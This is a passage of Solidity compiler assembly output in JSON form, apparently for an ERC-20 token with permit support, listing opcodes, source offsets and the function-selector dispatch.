											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "7ECEBE00"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMP"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPDEST"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "GT"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "23B872DD"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "30ADF81F"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "313CE567"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "3644E515"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMP"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPDEST"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "6FDDE03"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "95EA7B3"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "18160DDD"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "EQ"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPI"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "JUMPDEST"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "DUP1"
										},
										{
											"begin": 139,
											"end": 4483,
											"name": "REVERT"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP6"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP4"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP3"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "AND"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ISZERO"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPI"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SUB"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP4"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SUB"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "EXP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SUB"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "NOT"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "AND"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP3"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SUB"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "SWAP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "RETURN"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMPDEST"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP2"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "AND"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "ADD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMPDEST"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "MLOAD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP2"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "ISZERO"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "ISZERO"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP3"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "MSTORE"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "MLOAD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "DUP2"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SUB"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "ADD"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "RETURN"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMPDEST"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMPDEST"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "DUP1"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "MLOAD"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SWAP2"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "DUP3"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "MSTORE"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "MLOAD"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SWAP1"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "DUP2"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SWAP1"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SUB"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "ADD"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SWAP1"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "RETURN"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "JUMPDEST"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "DUP1"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "DUP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "DUP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "AND"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "DUP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "ADD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP1"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP2"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "AND"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP1"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "ADD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "PUSH [tag]",
											"value": "33"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "JUMPDEST"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMPDEST"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMPDEST"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "DUP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "MLOAD"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP3"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "AND"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "DUP3"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "MSTORE"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "MLOAD"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "DUP2"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SUB"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "ADD"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "SWAP1"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "RETURN"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "JUMPDEST"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "PUSH [tag]",
											"value": "39"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "JUMPDEST"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "DUP1"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "AND"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH [tag]",
											"value": "42"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "JUMPDEST"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "DUP1"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "AND"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH [tag]",
											"value": "45"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "JUMPDEST"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "DUP1"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 2,
											"end": 4,
